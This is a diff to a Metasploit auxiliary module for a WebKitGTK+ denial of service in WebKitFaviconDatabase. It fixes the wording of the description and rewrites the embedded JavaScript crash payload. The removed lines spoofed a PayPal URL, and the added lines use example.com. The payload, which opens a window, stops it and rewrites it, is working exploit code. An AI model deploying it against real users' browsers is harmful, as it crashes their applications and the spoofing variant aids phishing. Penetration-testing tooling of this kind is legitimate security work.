@@ -13,7 +13,7 @@ class MetasploitModule < Msf::Auxiliary
         'Name'           => "WebKitGTK+ WebKitFaviconDatabase DoS",
         'Description'    => %q(
           This module exploits a vulnerability in WebKitFaviconDatabase when pageURL is unset.
-          If successful,it could leads to application crash, denial of service.
+          If successful, it could lead to application crash, resulting in denial of service.
         ),
         'License'        => MSF_LICENSE,
         'Author'         => [
@@ -43,11 +43,11 @@ class MetasploitModule < Msf::Auxiliary
   def setup
     @html = <<-JS
 <script type="text/javascript">
-win=window.open("sleep_one_second.php", "WIN");
-window.open("https://www.paypal.com", "WIN");
-win.document.execCommand('Stop');
-win.document.write("Spoofed URL");
-win.document.close();
+ win = window.open("WIN", "WIN");
+ window.open("http://example.com/", "WIN");
+ win.document.execCommand('stop');
+ win.document.write("HelloWorld");
+ win.document.close();
 </script>
     JS
   end
